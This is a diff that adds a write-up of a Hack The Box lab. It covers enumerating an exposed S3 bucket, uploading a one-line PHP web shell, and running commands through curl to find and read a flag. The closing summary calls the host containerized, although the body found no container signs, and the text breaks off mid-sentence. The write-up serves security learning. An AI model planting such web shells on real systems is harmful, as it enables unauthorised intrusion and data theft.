@@ -1,0 +1,411 @@
+# TheToppers Documentation
+
+## Objective
+
+Gain access to the target web application, upload a web shell through exposed S3 storage, execute commands remotely, and retrieve the flag.
+
+---
+
+# Phase 1 — Configure AWS CLI
+
+Initial AWS configuration:
+
+```bash
+aws configure
+```
+
+Entered values:
+
+```text
+AWS Access Key ID: test
+AWS Secret Access Key: test
+Default region name: test
+Default output format: test
+```
+
+The first configuration attempt failed because credentials were missing.
+
+Verification command:
+
+```bash
+aws --endpoint-url http://s3.thetoppers.htb s3 ls
+```
+
+Result:
+
+```text
+2026-05-13 16:24:08 thetoppers.htb
+```
+
+This confirmed:
+
+* S3-compatible storage was exposed.
+* Credentials were accepted.
+* Bucket enumeration worked.
+
+---
+
+# Phase 2 — Enumerating the Bucket
+
+Command:
+
+```bash
+aws --endpoint-url http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
+```
+
+Result:
+
+```text
+PRE images/
+2026-05-13 16:24:08          0 .htaccess
+2026-05-13 16:24:08      11952 index.php
+```
+
+This confirmed:
+
+* The bucket contents mapped directly to the web root.
+* Uploaded files would likely become web-accessible.
+
+---
+
+# Phase 3 — Uploading Web Shell
+
+A PHP web shell was uploaded to the bucket.
+
+Typical shell example:
+
+```php
+<?php system($_GET['cmd']); ?>
+```
+
+After upload, remote command execution was tested.
+
+---
+
+# Phase 4 — Remote Command Execution
+
+Initial test:
+
+```bash
+curl "http://thetoppers.htb/shell.php?cmd=ls"
+```
+
+Output:
+
+```text
+images
+index.php
+shell.php
+test.txt
+```
+
+Confirmed:
+
+* Web shell execution worked.
+* Current directory contents were visible.
+
+Checking current user:
+
+```bash
+curl "http://thetoppers.htb/shell.php?cmd=whoami"
+```
+
+Output:
+
+```text
+www-data
+```
+
+Checking current directory:
+
+```bash
+curl "http://thetoppers.htb/shell.php?cmd=pwd"
+```
+
+Output:
+
+```text
+/var/www/html
+```
+
+---
+
+# Phase 5 — Understanding URL Encoding
+
+An early mistake:
+
+```bash
+curl "http://thetoppers.htb/shell.php?cmd=ls /home"
+```
+
+Result:
+
+```text
+curl: (3) URL rejected: Malformed input to a URL function
+```
+
+Cause:
+
+* Spaces were not URL encoded.
+
+Correct version:
+
+```bash
+curl "http://thetoppers.htb/shell.php?cmd=ls%20/home"
+```
+
+Output:
+
+```text
+svc
+```
+
+Key encoding rules:
+
+| Character | Encoding |
+| --------- | -------- |
+| Space     | %20      |
+| >         | %3E      |
+| &         | %26      |
+
+---
+
+# Phase 6 — User Enumeration
+
+Checking the svc user home directory:
+
+```bash
+curl "http://thetoppers.htb/shell.php?cmd=ls%20-la%20/home/svc"
+```
+
+Output:
+
+```text
+total 28
+drwxr-xr-x 4 svc  svc  4096 Jul 19  2022 .
+drwxr-xr-x 3 root root 4096 Jul 19  2022 ..
+lrwxrwxrwx 1 root root    9 Apr 18  2022 .bash_history -> /dev/null
+-rw-r--r-- 1 svc  svc   220 Apr 12  2022 .bash_logout
+-rw-r--r-- 1 svc  svc  3771 Apr 12  2022 .bashrc
+drwx------ 2 svc  svc  4096 Jul 19  2022 .cache
+drwx------ 3 svc  svc  4096 Jul 19  2022 .gnupg
+-rw-r--r-- 1 svc  svc   807 Apr 12  2022 .profile
+```
+
+Observation:
+
+* No `user.txt` existed in the expected location.
+* This suggested either:
+
+  * containerization,
+  * separated filesystem,
+  * or alternative flag placement.
+
+---
+
+# Phase 7 — Container Investigation
+
+Checking cgroups:
+
+```bash
+curl "http://thetoppers.htb/shell.php?cmd=cat%20/proc/1/cgroup"
+```
+
+Output:
+
+```text
+12:hugetlb:/
+11:pids:/
+10:cpu,cpuacct:/
+9:rdma:/
+8:freezer:/
+7:perf_event:/
+6:net_cls,net_prio:/
+5:memory:/
+4:devices:/
+3:blkio:/
+2:cpuset:/
+1:name=systemd:/init.scope
+0::/init.scope
+```
+
+Conclusion:
+
+* No obvious Docker/container indicators.
+* Enumeration continued.
+
+---
+
+# Phase 8 — Large Filesystem Search Problem
+
+A full filesystem search was attempted:
+
+```bash
+curl "http://thetoppers.htb/shell.php?cmd=find%20/%20-name%20user.txt%202%3E%261"
+```
+
+Result:
+
+* Massive permission denied spam.
+* No useful signal.
+
+Lesson:
+
+* Blind full-filesystem enumeration creates noise.
+* Targeted searches are more effective.
+
+---
+
+# Phase 9 — Searching for Alternative Flag Names
+
+Instead of continuing to search only for `user.txt`, a broader search was performed.
+
+Command:
+
+```bash
+curl "http://thetoppers.htb/shell.php?cmd=find%20/%20-name%20flag.txt%202%3E/dev/null"
+```
+
+Result:
+
+```text
+/var/www/flag.txt
+```
+
+This revealed the flag location.
+
+---
+
+# Phase 10 — Reading the Flag
+
+Command:
+
+```bash
+curl "http://thetoppers.htb/shell.php?cmd=cat%20/var/www/flag.txt"
+```
+
+This successfully retrieved the flag.
+
+---
+
+# Phase 11 — Understanding the Directory Structure
+
+The current directory was:
+
+```text
+/var/www/html
+```
+
+But the flag existed in:
+
+```text
+/var/www/flag.txt
+```
+
+Likely structure:
+
+```text
+/var
+└── www
+    ├── flag.txt
+    └── html
+        ├── index.php
+        ├── shell.php
+        └── images/
+```
+
+This explained why the flag did not appear in the current working directory.
+
+---
+
+# Important Lessons Learned
+
+## 1. URL Encoding Matters
+
+Commands sent through query strings must be URL encoded.
+
+## 2. Enumeration Beats Guessing
+
+Blindly hunting for flags wastes time.
+
+Better workflow:
+
+1. Enumerate users
+2. Enumerate directories
+3. Enumerate configs
+4. Enumerate privileges
+5. Search intelligently
+
+## 3. Permission Errors Are Normal
+
+`Permission denied` spam during `find /` is expected when operating as `www-data`.
+
+## 4. HTB Flags Are Usually Outcomes
+
+Flags are usually obtained through:
+
+* exploitation,
+* privilege escalation,
+* or proper enumeration.
+
+Not random guessing.
+
+## 5. Web Shell Access Is Only Initial Foothold
+
+Getting RCE is the beginning, not the end.
+
+---
+
+# Key Commands Used
+
+## AWS Enumeration
+
+```bash
+aws --endpoint-url http://s3.thetoppers.htb s3 ls
+aws --endpoint-url http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
+```
+
+## Web Shell Execution
+
+```bash
+curl "http://thetoppers.htb/shell.php?cmd=whoami"
+curl "http://thetoppers.htb/shell.php?cmd=pwd"
+curl "http://thetoppers.htb/shell.php?cmd=ls"
+```
+
+## Enumeration
+
+```bash
+curl "http://thetoppers.htb/shell.php?cmd=ls%20/home"
+curl "http://thetoppers.htb/shell.php?cmd=ls%20-la%20/home/svc"
+```
+
+## Flag Discovery
+
+```bash
+curl "http://thetoppers.htb/shell.php?cmd=find%20/%20-name%20flag.txt%202%3E/dev/null"
+curl "http://thetoppers.htb/shell.php?cmd=cat%20/var/www/flag.txt"
+```
+
+---
+
+# Final Result
+
+Successfully:
+
+* Enumerated exposed S3 storage
+* Uploaded PHP web shell
+* Achieved remote command execution
+* Enumerated filesystem
+* Located and read the flag
+
+
+Conclusion
+
+he objective of this assessment was to identify and exploit vulnerabilities present on the target system and obtain access to sensitive information. Initial reconnaissance revealed that the target was hosted on an Amazon AWS infrastructure and utilized an S3 bucket associated with the web application.
+
+During enumeration, a misconfigured S3 bucket was discovered that permitted unauthorized write access. This critical misconfiguration allowed arbitrary file uploads to the web server environment. By leveraging this weakness, a PHP web shell was successfully uploaded and executed remotely, resulting in command execution on the target system.
+
+Once command execution was established, post-exploitation enumeration was conducted to identify the execution context, available users, accessible directories, and potential locations of user and system flags. Enumeration revealed execution under a restricted service account (www-data) with limited permissions. Multiple attempts were made to locate standard user flag locations under /home and other common directories; however, the expected flag was not present in those locations.
+
+Further investigation identified that the target environment was likely containerized, which explained the unusual filesystem structure and absence of standard user artifacts. Continued filesystem enumeration eventually located a flag file at:
